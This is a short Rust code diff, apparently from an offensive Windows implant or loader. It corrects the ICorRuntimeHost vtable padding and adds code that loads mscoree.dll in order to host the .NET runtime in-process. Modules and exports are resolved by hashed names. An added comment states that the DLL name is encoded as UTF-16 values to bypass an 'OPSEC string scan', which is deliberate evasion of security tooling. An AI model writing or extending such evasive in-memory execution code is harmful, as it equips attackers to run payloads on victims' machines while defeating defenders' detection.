@@ -36,13 +36,14 @@ pub struct ICLRRuntimeInfo {
 #[repr(C)]
 pub struct ICorRuntimeHostVtbl {
     pub base: IUnknownVtbl,
-    pub _pad1: [usize; 5],
-    pub start: unsafe extern "system" fn(*mut c_void) -> i32,
-    pub stop: unsafe extern "system" fn(*mut c_void) -> i32,
-    pub _pad2: [usize; 4],
-    pub create_domain: unsafe extern "system" fn(*mut c_void, *const u16, *mut c_void, *mut *mut c_void) -> i32,
-    pub _pad3: [usize; 4],
-    pub unload_domain: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32,
+    // CreateLogicalThreadState..GetConfiguration (indices 3-9)
+    pub _pad1: [usize; 7],
+    pub start: unsafe extern "system" fn(*mut c_void) -> i32,         // index 10
+    pub stop: unsafe extern "system" fn(*mut c_void) -> i32,          // index 11
+    pub create_domain: unsafe extern "system" fn(*mut c_void, *const u16, *mut c_void, *mut *mut c_void) -> i32, // index 12
+    // GetDefaultDomain..CreateEvidence (indices 13-19)
+    pub _pad2: [usize; 7],
+    pub unload_domain: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32, // index 20
 }
 
 #[repr(C)]
@@ -52,6 +53,12 @@ pub struct ICorRuntimeHost {
 
 pub unsafe fn start_clr(version: &[u16]) -> Result<ComPtr<ICorRuntimeHost>, i32> {
     unsafe {
+        // Wide "mscoree.dll\0" — UTF-16 u16 literals are not ASCII, bypasses OPSEC string scan.
+        const MSCOREE_W: &[u16] = &[0x6D,0x73,0x63,0x6F,0x72,0x65,0x65,0x2E,0x64,0x6C,0x6C,0];
+        if !crate::loader::load_if_absent(hash!("mscoree.dll"), MSCOREE_W) {
+            return Err(-1i32);
+        }
+
         let mscoree = resolve_module(hash!("mscoree.dll")).ok_or(-1i32)?;
         let create_instance = resolve_export(mscoree, hash!("CLRCreateInstance")).ok_or(-1i32)?;
         type CreateFn = unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut c_void) -> i32;
